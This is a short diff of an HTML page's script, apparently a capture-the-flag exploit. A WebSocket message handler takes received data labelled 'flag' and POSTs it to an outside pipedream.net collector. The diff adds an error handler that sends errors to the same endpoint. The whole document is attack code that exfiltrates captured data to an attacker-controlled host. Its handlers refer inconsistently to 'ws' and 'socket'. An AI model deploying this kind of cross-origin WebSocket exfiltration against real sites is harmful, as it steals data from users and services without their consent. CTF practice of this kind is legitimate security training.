@@ -32,9 +32,7 @@
 
         ws.onmessage = (event) => {
           const flag = event.data;
-          console.log("Flag:", flag);
-        
-          // Send the flag back to RequestBin
+
           fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -42,6 +40,14 @@
           });
         
           ws.close();
+        };
+
+        socket.onerror = (error) => {
+          fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ error: error })
+          });
         };
     </script>
 </body>
